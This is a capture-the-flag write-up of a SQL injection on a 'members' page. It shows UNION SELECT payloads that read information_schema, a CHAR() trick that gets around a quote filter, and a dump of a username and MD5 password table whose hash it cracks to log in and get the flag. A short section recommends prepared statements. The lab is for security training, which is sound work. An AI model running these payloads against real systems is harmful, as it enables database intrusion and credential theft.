# MEMBERS PAGE

## Explanations

While we were working on the images SQL injection, we noticed a strange table_schema. We used this:
```sql
1 UNION SELECT table_name, table_schema FROM information_schema.columns
```
and it gave this interesting info:
```
ID: 1 UNION SELECT table_name, table_schema FROM information_schema.columns 
First name: db_default
Surname : Member_Brute_Force
```

`Member_Brute_Force` ? We need to go deeper in this table and get the column names. Normally in SQL it would look like:
```sql
SELECT column_name, column_name FROM information_schema.columns WHERE table_schema='Member_Brute_Force'
```
However using quotes in the injection is not accepted... Why not trying to give him 1 by 1 the characters with `CHAR()` from SQL ?
The char codes for `Member_Brute_Force` would be `77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101`

Now let's try:
```sql
1 UNION SELECT column_name, column_name FROM information_schema.columns WHERE table_schema=CHAR(77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101)
```
which gives us:
```
ID: 1 UNION SELECT column_name, column_name FROM information_schema.columns WHERE table_schema=CHAR(77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101) 
First name: id
Surname : id

ID: 1 UNION SELECT column_name, column_name FROM information_schema.columns WHERE table_schema=CHAR(77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101) 
First name: username
Surname : username

ID: 1 UNION SELECT column_name, column_name FROM information_schema.columns WHERE table_schema=CHAR(77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101) 
First name: password
Surname : password
```

Nice ! It seems like this table contains usernames and passwords, let's check them with:
```sql
1 UNION SELECT username, password FROM Member_Brute_Force.db_default
```
which gives us:
```
ID: 1 UNION SELECT username, password FROM Member_Brute_Force.db_default 
First name: root
Surname : 3bf1114a986ba87ed28fc1b5884fc2f8

ID: 1 UNION SELECT username, password FROM Member_Brute_Force.db_default 
First name: admin
Surname : 3bf1114a986ba87ed28fc1b5884fc2f8
```

Great ! We have the root/admin identifiers. It seems like the password is MD5 encrypted, we decrypt it => `shadow`

Let's try to sign in now => Bingo ! The flag is : `B3A6E43DDF8B4BBB4125E5E7D23040433827759D4DE1C04EA63907479A80A6B2`

---

## How to avoid that security breach ?

A good way to counter that could be to use Prepared statements. ORMs do that trick usually pretty well. This coding style allows the database to distinguish between code and data, regardless of what user input is supplied.

---

- [All infos about SQL database](https://stackoverflow.com/questions/600446/how-do-you-return-the-column-names-of-a-table)  
- [SQL injection prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [Find Table Names for SQL Injection](https://www.sqlinjection.net/table-names/)
- [MD5 decrypt](https://md5decrypt.net/)
